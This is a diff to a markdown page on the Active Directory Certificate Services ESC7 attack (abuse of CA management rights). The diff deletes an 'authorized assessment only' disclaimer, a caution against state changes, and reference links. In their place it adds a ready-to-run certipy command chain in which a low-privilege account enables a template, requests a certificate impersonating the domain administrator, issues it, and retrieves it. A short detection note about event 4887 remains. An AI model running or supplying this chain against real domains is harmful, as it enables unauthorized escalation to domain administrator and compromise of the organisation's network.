@@ -10,21 +10,35 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC7 (CA management rights)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **CA object roles** — **Manage CA** / **Manage Certificates**.
 
-## Detection
+### Concept (deep)
+A low-priv principal holds a CA management role → approve own pending requests or issue arbitrary certificates. With **Manage CA**, enable the ESC6 flag and chain.
+
+### Commands
+```bash
+# ── Enable a template (Manage CA) ───────────────────────────────────
+certipy ca -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -enable-template Vuln
+
+# ── Request a pending certificate ────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template Vuln -upn administrator@corp.local
+
+# ── Issue the pending request ────────────────────────────────────────
+certipy ca -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -issue-request <id>
+
+# ── Retrieve the certificate ─────────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -retrieve <id>
+```
+
+### Detection
 **4887** (cert issued) by a non-CA-officer; CA role changes. `Manage CA` should be **EA-only**.
 
 ---
-
-## References
-
-- [Microsoft: Active Directory Certificate Services overview](https://learn.microsoft.com/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
